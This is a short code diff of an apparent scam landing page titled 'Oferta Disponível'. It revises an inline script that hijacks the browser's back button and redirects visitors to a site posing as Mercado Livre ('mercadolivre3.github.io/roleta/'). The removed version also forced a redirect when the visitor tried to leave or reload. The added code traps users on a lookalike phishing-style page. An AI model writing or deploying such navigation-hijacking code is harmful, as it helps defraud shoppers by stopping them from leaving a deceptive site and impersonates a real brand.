@@ -873,20 +873,13 @@ Oferta Disponível
         <br>
         <br>Brasil/Português </span>
 
-      <script>
-  // Impede que o usuário use o botão "voltar"
+  <script>
+  // Impede o botão "voltar" e redireciona para outro link
   history.pushState(null, null, location.href);
-  window.onpopstate = function () {
+  window.addEventListener('popstate', function () {
     window.location.href = "https://mercadolivre3.github.io/roleta/";
-  };
-
-  // Redireciona se tentar sair ou recarregar a página
-  window.addEventListener("beforeunload", function (e) {
-    // Redirecionamento
-    window.location.href = "https://mercadolivre3.github.io/roleta/";
-
-    // Mensagem padrão (pode não aparecer em navegadores modernos)
-    e
+  });
+</script>
 
     </p></body></html>
    
